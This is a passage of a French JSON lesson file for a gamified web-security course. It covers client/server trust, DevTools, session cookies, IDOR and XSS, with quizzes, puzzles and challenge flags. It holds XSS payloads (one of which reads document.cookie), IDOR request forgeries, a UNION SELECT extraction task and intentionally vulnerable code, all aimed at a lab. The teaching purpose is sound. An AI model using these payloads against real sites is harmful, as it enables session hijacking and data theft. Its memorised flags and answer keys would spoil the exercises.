            "debrief": "Faux. L'injection SQL vole le nouveau mot de passe instantanément."
          },
          {
            "text": "Interdire les adresses IP provenant de l'étranger.",
            "isCorrect": false,
            "debrief": "Faux. L'injection peut provenir de n'importe quel réseau."
          },
          {
            "text": "Remplacer SQLite par MySQL sans changer le code de concaténation.",
            "isCorrect": false,
            "debrief": "Faux. MySQL est tout aussi vulnérable si le code concatène."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans le CRM Aegis, applique une injection UNION SELECT pour extraire la clé secrète de secops_admin de la table crm_accounts. Soumets la valeur complète KEY{...} !",
      "flag": "KEY{JWT_SECRET_SIGN_KEY_AEGIS_99}"
    }
  },
  {
    "id": "m4-l1",
    "unitId": "m4",
    "title": "1. Client (Navigateur) vs Serveur (Backend)",
    "icon": "🌐",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "Les Deux Côtés de la Barrière",
        "bullets": [
          "Quand tu surfes sur un site web, deux ordinateurs travaillent ensemble : ton propre ordinateur (le **Client** / Navigateur) et l'ordinateur distant (le **Serveur** / Backend).",
          "Le navigateur reçoit trois langages :",
          "• **HTML** : la structure du texte et des boutons (le squelette).",
          "• **CSS** : les couleurs, polices et mises en page (le maquillage).",
          "• **JavaScript** : le code qui s'exécute **directement dans ton navigateur** pour animer la page !"
        ]
      },
      {
        "title": "La Règle d'Or : Ne Jamais Faire Confiance au Client",
        "bullets": [
          "Tout ce qui se trouve côté client (dans ton navigateur) est **100% sous ton contrôle total**.",
          "Tu peux modifier le code HTML, réécrire les scripts JavaScript, changer les valeurs des formulaires et manipuler les requêtes réseau à volonté.",
          "Si un développeur place la sécurité uniquement côté client, son application est déjà compromise !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"150\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"100\" y=\"50\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">CLIENT (Navigateur)</text>\n          <text x=\"100\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">HTML / CSS / JavaScript</text>\n          <text x=\"100\" y=\"85\" fill=\"#f59e0b\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Contrôlé par l'utilisateur !</text>\n          <path d=\"M 185 60 L 225 60\" stroke=\"#475569\" stroke-width=\"2\"/>\n          <rect x=\"235\" y=\"25\" width=\"140\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"305\" y=\"50\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">SERVEUR (Backend)</text>\n          <text x=\"305\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Node / PHP / SQLite</text>\n          <text x=\"305\" y=\"85\" fill=\"#38bdf8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Vérification de sécurité</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "javascript",
        "lines": [
          {
            "num": 1,
            "text": "// ❌ ERREUR DE DÉVELOPPEUR : Vérification de sécurité faite dans le navigateur !"
          },
          {
            "num": 2,
            "text": "if (userRole === 'admin') { showAdminButton(); }",
            "isCritical": true,
            "note": "L'attaquant peut ouvrir la console F12 et taper userRole = 'admin' pour contourner le contrôle !"
          },
          {
            "num": 3,
            "text": "// La vérification doit TOUJOURS être ré-exécutée côté serveur"
          }
        ],
        "prompt": "Clique sur la ligne où la vérification d'autorisation est naïvement confiée au client :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la condition côté client manipulable par un attaquant dans sa console :",
        "tokens": [
          "if (userRole === 'admin')",
          "showAdminButton();",
          "db.query()"
        ],
        "correctOrder": [
          "if (userRole === 'admin')",
          "showAdminButton();"
        ]
      },
      "quickQuiz": {
        "prompt": "Pourquoi est-il strictement interdit en cybersécurité de valider les droits d'un utilisateur uniquement en JavaScript dans le navigateur ?",
        "options": [
          {
            "text": "Parce que le protocole HTTP interdit l'usage de conditions if.",
            "isCorrect": false,
            "debrief": "Faux. HTTP transporte du code sans l'interpréter."
          },
          {
            "text": "Parce que le JavaScript ne fonctionne que sur les ordinateurs Apple.",
            "isCorrect": false,
            "debrief": "Faux. JavaScript fonctionne sur tous les navigateurs de la planète."
          },
          {
            "text": "Parce que l'utilisateur a un contrôle absolu sur son navigateur et peut modifier ou désactiver le code JavaScript avec les DevTools F12.",
            "isCorrect": true,
            "debrief": "Exact ! Le client est un environnement non fiable par définition."
          },
          {
            "text": "Parce que le navigateur détruit les données toutes les 10 minutes.",
            "isCorrect": false,
            "debrief": "Faux. La persistance est gérée par le stockage local."
          }
        ]
      }
    },
    "challenge": {
      "type": "idor_target",
      "instructions": "Dans le portail financier Aegis ci-dessous, consulte ta facture légitime n°102. Soumets l'intitulé de la facture affiché (Facture #INV-2026-102) !",
      "flag": "Facture #INV-2026-102"
    }
  },
  {
    "id": "m4-l2",
    "unitId": "m4",
    "title": "2. Les Outils DevTools (Touche F12)",
    "icon": "🛠️",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "L'Arme Ultime Intégrée au Navigateur",
        "bullets": [
          "Chaque navigateur moderne (Chrome, Firefox, Edge) possède une suite d'ingénierie intégrée accessible en appuyant sur la touche **F12** : les **DevTools**.",
          "C'est la radiographie complète de la page web en direct."
        ]
      },
      {
        "title": "Les 4 Onglets Capitaux de l'Analyste",
        "bullets": [
          "• **Éléments / Inspecteur** : affiche le code HTML en direct. Tu peux double-cliquer pour changer un prix, démasquer un champ caché (`type='hidden'`) ou débloquer un bouton grisé !",
          "• **Console** : un terminal JavaScript direct connecté à la page.",
          "• **Réseau (Network)** : écoute et enregistre chaque requête HTTP envoyée et reçue avec ses en-têtes et paramètres.",
          "• **Application / Stockage** : permet de lire et modifier les **Cookies** et le LocalStorage."
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"80\" height=\"70\" rx=\"6\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"65\" y=\"55\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">F12</text>\n          <text x=\"65\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Inspecteur</text>\n          <rect x=\"115\" y=\"25\" width=\"80\" height=\"70\" rx=\"6\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"155\" y=\"55\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">Console</text>\n          <text x=\"155\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">JavaScript</text>\n          <rect x=\"205\" y=\"25\" width=\"80\" height=\"70\" rx=\"6\" fill=\"#0f172a\" stroke=\"#3b82f6\" stroke-width=\"2\"/>\n          <text x=\"245\" y=\"55\" fill=\"#60a5fa\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">Réseau</text>\n          <text x=\"245\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Requêtes HTTP</text>\n          <rect x=\"295\" y=\"25\" width=\"80\" height=\"70\" rx=\"6\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"335\" y=\"55\" fill=\"#fbbf24\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">Cookies</text>\n          <text x=\"335\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Sessions</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "javascript",
        "lines": [
          {
            "num": 1,
            "text": "// Exécution directe dans la Console F12 de l'analyste :"
          },
          {
            "num": 2,
            "text": "console.log(document.cookie);",
            "isCritical": true,
            "note": "La console F12 permet d'interagir immédiatement avec l'environnement de la page"
          },
          {
            "num": 3,
            "text": "// Affiche les cookies de session actifs de l'utilisateur"
          }
        ],
        "prompt": "Clique sur l'instruction JavaScript exécutable dans la console pour inspecter les cookies :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande JavaScript pour afficher les cookies dans la console F12 :",
        "tokens": [
          "console.log(",
          "document.cookie",
          ");",
          "alert(1)"
        ],
        "correctOrder": [
          "console.log(",
          "document.cookie",
          ");"
        ]
      },
      "quickQuiz": {
        "prompt": "Quel onglet des DevTools (F12) permet d'espionner toutes les requêtes HTTP (méthodes, codes de statut, payloads) échangées avec le serveur ?",
        "options": [
          {
            "text": "L'onglet Thème graphique.",
            "isCorrect": false,
            "debrief": "Faux. Cet onglet n'existe pas pour l'analyse de protocole."
          },
          {
            "text": "L'onglet Performance.",
            "isCorrect": false,
            "debrief": "Faux. Performance sert au profilage de framerate et mémoire."
          },
          {
            "text": "L'onglet Mémoire (Memory Heap).",
            "isCorrect": false,
            "debrief": "Faux. Memory sert à chasser les fuites de mémoire vive."
          },
          {
            "text": "L'onglet Réseau (Network).",
            "isCorrect": true,
            "debrief": "Exact ! L'onglet Réseau capture en temps réel chaque communication HTTP."
          }
        ]
      }
    },
    "challenge": {
      "type": "idor_target",
      "instructions": "Dans le portail de facturation, observe le montant de ta facture n°102 affiché en euros. Soumets le montant numérique brut (1250) !",
      "flag": "1250"
    }
  },
  {
    "id": "m4-l3",
    "unitId": "m4",
    "title": "3. Cookies & Gestion de Session",
    "icon": "🍪",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "HTTP est Amnésique : L'État Sans État (Stateless)",
        "bullets": [
          "Par conception d'origine, le protocole HTTP est totalement amnésique : dès qu'une page a fini de charger, le serveur oublie instantanément qui tu es.",
          "Sans un système de mémoire, tu devrais retaper ton mot de passe à chaque fois que tu cliques sur un lien !",
          "Pour résoudre ce problème, on a inventé les **Cookies de session**."
        ]
      },
      {
        "title": "Le Tampon sur le Poignet",
        "bullets": [
          "Quand tu te connectes avec succès, le serveur t'envoie un en-tête `Set-Cookie: session_id=abc123xyz`.",
          "C'est comme un tampon invisible sur ton poignet à l'entrée d'une boîte de nuit.",
          "À chaque requête suivante, ton navigateur renvoie automatiquement ce tampon dans l'en-tête `Cookie: session_id=abc123xyz`.",
          "Si un attaquant réussit à copier ce cookie, il devient **TOI** instantanément sans avoir besoin de ton mot de passe !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"120\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"85\" y=\"55\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Navigateur</text>\n          <text x=\"85\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Stocke le Cookie</text>\n          <path d=\"M 155 50 L 245 50\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"200\" y=\"42\" fill=\"#fbbf24\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Cookie: session=xyz ➔</text>\n          <rect x=\"255\" y=\"25\" width=\"120\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"315\" y=\"55\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Serveur</text>\n          <text x=\"315\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Reconnaît l'utilisateur</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "http",
        "lines": [
          {
            "num": 1,
            "text": "GET /api/profile HTTP/1.1"
          },
          {
            "num": 2,
            "text": "Host: aegis-defense.local"
          },
          {
            "num": 3,
            "text": "Cookie: session_token=SECRET_SESSION_TOKEN_42",
            "isCritical": true,
            "note": "Le cookie de session prouve l'identité de l'utilisateur à chaque requête"
          }
        ],
        "prompt": "Clique sur l'en-tête HTTP qui transporte le jeton de session :"
      },
      "tokenPuzzle": {
        "instruction": "Reconstitue l'en-tête HTTP de transmission du jeton de cookie de session :",
        "tokens": [
          "Cookie:",
          "session_id=SECRET_SESSION_99;",
          "User-Agent:",
          "Host:"
        ],
        "correctOrder": [
          "Cookie:",
          "session_id=SECRET_SESSION_99;"
        ]
      },
      "quickQuiz": {
        "prompt": "Que se passe-t-il si un pirate intercepte ou vole la valeur de ton cookie de session d'un site web ?",
        "options": [
          {
            "text": "Il peut l'injecter dans son propre navigateur et usurper ton compte connecté sans connaître ton mot de passe.",
            "isCorrect": true,
            "debrief": "Exact ! C'est ce qu'on appelle le vol de session (Session Hijacking)."
          },
          {
            "text": "Son ordinateur prend feu physiquement.",
            "isCorrect": false,
            "debrief": "Faux. Aucun risque physique matériel."
          },
          {
            "text": "Le mot de passe de ton compte est automatiquement remplacé par des zéros.",
            "isCorrect": false,
            "debrief": "Faux. Le mot de passe ne change pas."
          },
          {
            "text": "Le serveur refuse toutes les futures connexions mondiales.",
            "isCorrect": false,
            "debrief": "Faux. Le serveur ne sait même pas qu'il s'agit d'un usurpateur."
          }
        ]
      }
    },
    "challenge": {
      "type": "idor_target",
      "instructions": "Dans le portail financier, repère l'identifiant numérique de ton compte transmis dans le champ ID. Soumets ce numéro client (102) !",
      "flag": "102"
    }
  },
  {
    "id": "m4-l4",
    "unitId": "m4",
    "title": "4. Le Vol d'Accès IDOR (Changer un Chiffre)",
    "icon": "🔑",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "L'Une des Failles les Plus Répandues au Monde",
        "bullets": [
          "**IDOR** signifie **Insecure Direct Object Reference** (Référence Directe Non Sécurisée à un Objet).",
          "Imagine que tu consultes ta facture médicale sur un site. L'URL est : `https://hopital.com/facture?id=102`.",
          "Que se passe-t-il si tu remplaces simplement `102` par `101` dans la barre d'adresse ?"
        ]
      },
      {
        "title": "L'Absence Totale de Contrôle d'Autorisation",
        "bullets": [
          "Dans une application mal programmée, le serveur prend le chiffre `101`, va chercher la facture n°101 en base et te l'affiche **sans vérifier si tu en es le propriétaire légitime** !",
          "C'est une faille d'autorisation monumentale : en faisant varier un simple numéro, un attaquant peut télécharger toutes les factures, tous les contrats et tous les profils privés de l'entreprise en quelques minutes."
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"107\" y=\"50\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Ma facture : id=102</text>\n          <text x=\"107\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Accès Légitime (1 250 €)</text>\n          <path d=\"M 200 60 L 235 60\" stroke=\"#f43f5e\" stroke-width=\"3\"/>\n          <rect x=\"245\" y=\"25\" width=\"140\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"315\" y=\"50\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">IDOR : id=101</text>\n          <text x=\"315\" y=\"70\" fill=\"#fbbf24\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Facture Direction (4,5M €)</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "javascript",
        "lines": [
          {
            "num": 1,
            "text": "// ❌ CODE BACKEND VULNÉRABLE À L'IDOR :"
          },
          {
            "num": 2,
            "text": "app.get('/api/invoices/:id', (req, res) => {",
            "isCritical": true,
            "note": "Le serveur extrait l'ID demandé sans vérifier l'appartenance à la session"
          },
          {
            "num": 3,
            "text": "  const invoice = db.query('SELECT * FROM invoices WHERE id = ?', [req.params.id]);"
          },
          {
            "num": 4,
            "text": "  res.json(invoice); // N'importe qui peut lire n'importe quelle facture !"
          },
          {
            "num": 5,
            "text": "});"
          }
        ],
        "prompt": "Clique sur la route API qui accepte un identifiant direct sans contrôle de propriétaire :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble l'URL détournée exploitant la faille IDOR pour cibler le document n°101 :",
        "tokens": [
          "GET /api/invoices/",
          "101",
          "102",
          "DROP"
        ],
        "correctOrder": [
          "GET /api/invoices/",
          "101"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle est la définition exacte d'une vulnérabilité IDOR (Insecure Direct Object Reference) ?",
        "options": [
          {
            "text": "Une surcharge de mémoire vive provoquée par un trop grand nombre d'images.",
            "isCorrect": false,
            "debrief": "Faux. C'est une faille de logique d'autorisation, pas de mémoire."
          },
          {
            "text": "Un câble réseau débranché dans le centre de données.",
            "isCorrect": false,
            "debrief": "Faux. C'est un problème matériel sans lien avec l'IDOR."
          },
          {
            "text": "L'accès à une ressource confidentielle simplement en modifiant son identifiant dans la requête, sans que le serveur ne vérifie les droits de l'utilisateur.",
            "isCorrect": true,
            "debrief": "Exact ! C'est un défaut de contrôle d'accès au niveau des objets métier."
          },
          {
            "text": "L'utilisation d'une police de caractères non supportée par le navigateur.",
            "isCorrect": false,
            "debrief": "Faux. La typographie n'a aucun impact de sécurité."
          }
        ]
      }
    },
    "challenge": {
      "type": "idor_target",
      "instructions": "Dans le portail financier, modifie le numéro de facture 102 par 101 pour accéder à la facture confidentielle de la direction. Soumets le drapeau CYBER{...} trouvé dans les détails !",
      "flag": "CYBER{IDOR_DIRECT_OBJECT_FINANCIAL_LEAK}"
    }
  },
  {
    "id": "m4-mid",
    "unitId": "m4",
    "title": "ÉVALUATION MI-PARCOURS : AUDIT DE SESSIONS & IDOR RH",
    "icon": "🛡️",
    "isCheckpoint": true,
    "xp": 75,
    "lessonSlides": [
      {
        "title": "AUDIT DE CONTRÔLE D'ACCÈS : Bordereaux Stratégiques de la Présidence",
        "bullets": [
          "Le portail financier restreint d'Aegis traite les factures et ordres de paiement confidentiels.",
          "Ton profil utilisateur est restreint aux factures de commodité standard (ex: facture n°42).",
          "Cette épreuve récapitule : architecture client-serveur, manipulation des DevTools, inspection des paramètres de requêtes et falsification de références directes (IDOR)."
        ]
      },
      {
        "title": "Mission de Test d'Intrusion (Sans Guidage)",
        "bullets": [
          "1. Ouvre le visualiseur de facturation ci-dessous.",
          "2. Identifie la référence directe manipulable dans l'interface.",
          "3. Audite les identifiants réservés au Conseil de Surveillance (bordereau n°1) et soumets le code de compensation officiel !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 500 130\" class=\"w-full h-full\">\n          <rect width=\"500\" height=\"130\" rx=\"12\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <circle cx=\"65\" cy=\"65\" r=\"32\" fill=\"#f59e0b\" fill-opacity=\"0.15\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"65\" y=\"74\" fill=\"#f59e0b\" font-size=\"28\" text-anchor=\"middle\">🛡️</text>\n          <text x=\"120\" y=\"45\" fill=\"#f8fafc\" font-size=\"14\" font-family=\"monospace\" font-weight=\"bold\">CHECKPOINT IDOR & SESSION MI-PARCOURS</text>\n          <text x=\"120\" y=\"70\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\">Périmètre : Portail de Facturation / Endpoint /invoices</text>\n          <rect x=\"120\" y=\"85\" width=\"350\" height=\"26\" rx=\"6\" fill=\"#1e293b\" stroke=\"#334155\"/>\n          <text x=\"130\" y=\"102\" fill=\"#f59e0b\" font-size=\"11\" font-family=\"monospace\">Cible : Bordereau n°1 (Présidence & Surveillance)</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "javascript",
        "lines": [
          {
            "num": 1,
            "text": "// Audit de contrôle d'accès : falsification de l'identifiant direct"
          },
          {
            "num": 2,
            "text": "fetch('/targets/api/invoices?id=1'); // Bordereau n°1 Présidence",
            "isCritical": true,
            "note": "La falsification du paramètre id vers la ressource 1 permet de franchir le cloisonnement"
          },
          {
            "num": 3,
            "text": "{ invoice_id: 'INV-2026-001', confidentiality: 'SECRET DEFENSE' }"
          }
        ],
        "prompt": "Clique sur l'appel API qui falsifie la référence directe vers le bordereau présidentiel :"
      },
      "tokenPuzzle": {
        "instruction": "Reconstitue la requête directe pour accéder au bordereau d'autorisation n°1 :",
        "tokens": [
          "GET /targets/api/invoices?id=",
          "1",
          "42",
          "DELETE"
        ],
        "correctOrder": [
          "GET /targets/api/invoices?id=",
          "1"
        ]
      },
      "quickQuiz": {
        "prompt": "Pourquoi une vulnérabilité IDOR est-elle considérée comme un échec critique d'architecture ?",
        "options": [
          {
            "text": "Parce qu'elle empêche le navigateur d'afficher les polices d'écriture en gras.",
            "isCorrect": false,
            "debrief": "Faux. L'IDOR est une brèche d'autorisation de données, aucun lien visuel."
          },
          {
            "text": "Parce que le serveur s'appuie aveuglément sur un identifiant fourni par le client sans valider que la session a le droit d'y accéder.",
            "isCorrect": true,
            "debrief": "Exact ! La sécurité ne doit JAMAIS faire confiance aux entrées envoyées par le client web."
          },
          {
            "text": "Parce qu'elle n'affecte que les ordinateurs utilisant un écran tactile.",
            "isCorrect": false,
            "debrief": "Faux. Tous les clients HTTP sont concernés de la même façon."
          },
          {
            "text": "Parce qu'elle augmente automatiquement la facture internet de la victime.",
            "isCorrect": false,
            "debrief": "Faux. C'est une extraction de données confidentielles."
          }
        ]
      }
    },
    "challenge": {
      "type": "idor_target",
      "instructions": "Dans le portail de facturation, cible le bordereau n°1 de la Présidence pour extraire les données classifiées SECRET DEFENSE. Soumets le code de virement FLAG !",
      "flag": "CYBER{CLIENT_MID_EVAL_IDOR_SESSION_PWNED}"
    }
  },
  {
    "id": "m4-l5",
    "unitId": "m4",
    "title": "5. Qu'est-ce que le Cross-Site Scripting (XSS) ?",
    "icon": "⚡",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "Forcer le Navigateur d'Autrui à Obéir",
        "bullets": [
          "Le **Cross-Site Scripting** (noté **XSS**) est l'une des attaques web les plus célèbres et les plus destructrices.",
          "Le principe fondamental : l'attaquant réussit à **injecter son propre code JavaScript malveillant** à l'intérieur d'une page web légitime.",
          "Quand une autre personne (ex: un administrateur) visite la page, son propre navigateur exécute ce code avec les droits de la victime !"
        ]
      },
      {
        "title": "La Sonde XSS Universelle",
        "bullets": [
          "Pour tester si un champ de texte est vulnérable au XSS, les pentesters injectent une balise script inoffensive qui ouvre une boîte de dialogue :",
          "`<script>alert(1)</script>` ou `<img src=x onerror=alert(1)>`.",
          "Si la boîte de dialogue surgit à l'écran, cela prouve que le code injecté a été interprété par le moteur JavaScript du navigateur !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"107\" y=\"50\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">&lt;script&gt;alert(1)&lt;/script&gt;</text>\n          <text x=\"107\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Payload injecté</text>\n          <path d=\"M 200 60 L 235 60\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <rect x=\"245\" y=\"25\" width=\"140\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"315\" y=\"50\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Boîte alert(1) !</text>\n          <text x=\"315\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Exécution JS validée</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "javascript",
        "lines": [
          {
            "num": 1,
            "text": "// ❌ AFFICHAGE NON ÉCHAPPÉ DANS LE DOM :"
          },
          {
            "num": 2,
            "text": "document.getElementById('welcome').innerHTML = userInput;",
            "isCritical": true,
            "note": "innerHTML interprète le HTML et les balises <script> injectées par l'utilisateur"
          },
          {
            "num": 3,
            "text": "// La bonne pratique sécurisée est d'utiliser textContent"
          }
        ],
        "prompt": "Clique sur la propriété vulnérable qui interprète les balises HTML/JS :"
      },
      "tokenPuzzle": {
        "instruction": "Construis la balise d'injection XSS minimale pour tester la présence de la faille :",
        "tokens": [
          "<script>",
          "alert(1)",
          "</script>",
          "<h1>"
        ],
        "correctOrder": [
          "<script>",
          "alert(1)",
          "</script>"
        ]
      },
      "quickQuiz": {
        "prompt": "Dans quel environnement le code malveillant d'une faille XSS s'exécute-t-il ?",
        "options": [
          {
            "text": "Dans la base de données SQL.",
            "isCorrect": false,
            "debrief": "Faux. La base stocke le texte, mais c'est le navigateur qui l'exécute."
          },
          {
            "text": "Dans la mémoire vive du routeur WiFi du fournisseur d'accès.",
            "isCorrect": false,
            "debrief": "Faux. Le routeur ne fait que router des paquets TCP."
          },
          {
            "text": "Dans le navigateur web de la victime qui consulte la page infectée.",
            "isCorrect": true,
            "debrief": "Exact ! Le XSS est une faille côté client exécutée par le moteur JavaScript du navigateur."
          },
          {
            "text": "Sur le processeur de la carte mère du centre de données.",
            "isCorrect": false,
            "debrief": "Faux. Le serveur ne fait que renvoyer le texte, c'est le client qui l'exécute."
          }
        ]
      }
    },
    "challenge": {
      "type": "webmail_target",
      "instructions": "Dans l'interface SkyMail Webmail, crée un message avec le payload <script>alert(1)</script> dans le champ 'Objet'. Soumets la commande JavaScript exécutée (alert(1)) !",
      "flag": "alert(1)"
    }
  },
  {
    "id": "m4-l6",
    "unitId": "m4",
    "title": "6. XSS Réfléchie (Reflected XSS)",
    "icon": "🪞",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "L'Effet Miroir de l'URL",
        "bullets": [
          "Une faille **XSS Réfléchie** (Reflected XSS) se produit quand un paramètre passé dans l'URL est immédiatement réinjecté dans le code HTML de la page de réponse sans être nettoyé ni encodé.",
          "Exemple : `https://site.com/search?q=<script>alert(1)</script>`.",
          "Le serveur répond : *Votre recherche pour <script>alert(1)</script> n'a donné aucun résultat*... et le navigateur exécute le script immédiatement !"
        ]
      },
      {
        "title": "Comment Piéger une Victime",
        "bullets": [
          "Le payload n'est pas stocké sur le serveur.",
          "L'attaquant doit donc convaincre la victime de **cliquer sur un lien piégé** (par phishing ou e-mail frauduleux) contenant le code JavaScript directement dissimulé dans l'adresse web !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"107\" y=\"50\" fill=\"#38bdf8\" font-size=\"10\" font-family=\"monospace\" text-anchor=\"middle\">Lien : ?q=&lt;script&gt;...</text>\n          <text x=\"107\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Clic de la victime</text>\n          <path d=\"M 200 60 L 235 60\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <rect x=\"245\" y=\"25\" width=\"140\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"315\" y=\"50\" fill=\"#fbbf24\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Réflexion Miroir</text>\n          <text x=\"315\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Exécution immédiate</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "html",
        "lines": [
          {
            "num": 1,
            "text": "<!-- Résultat HTML renvoyé par le serveur après recherche : -->"
          },
          {
            "num": 2,
            "text": "<h1>Résultats pour : <img src=x onerror=alert(document.cookie)></h1>",
            "isCritical": true,
            "note": "Le paramètre d'URL est réinjecté sans encodage des caractères < et >"
          },
          {
            "num": 3,
            "text": "<!-- Le navigateur tente de charger l'image 'x', échoue et exécute onerror -->"
          }
        ],
        "prompt": "Clique sur la ligne HTML vulnérable qui reflète le payload d'erreur d'image :"
      },
      "tokenPuzzle": {
        "instruction": "Reconstitue le payload XSS alternatif exploitant l'attribut onerror d'une balise img :",
        "tokens": [
          "<img src=x",
          "onerror=alert(document.cookie)>",
          "<script>",
          "<h1>"
        ],
        "correctOrder": [
          "<img src=x",
          "onerror=alert(document.cookie)>"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle est la caractéristique distinctive d'une attaque XSS Réfléchie (Reflected) par rapport à une XSS Stockée ?",
        "options": [
          {
            "text": "Le code malveillant n'est pas sauvegardé sur le serveur ; il transite dans la requête (URL) et est renvoyé dans la réponse.",
            "isCorrect": true,
            "debrief": "Exact ! La victime doit obligatoirement cliquer sur un lien forgé contenant le payload."
          },
          {
            "text": "Elle détruit physiquement le serveur web en 24 heures.",
            "isCorrect": false,
            "debrief": "Faux. Elle ne détruit aucun composant serveur."
          },
          {
            "text": "Elle s'exécute uniquement si l'ordinateur est débranché du secteur.",
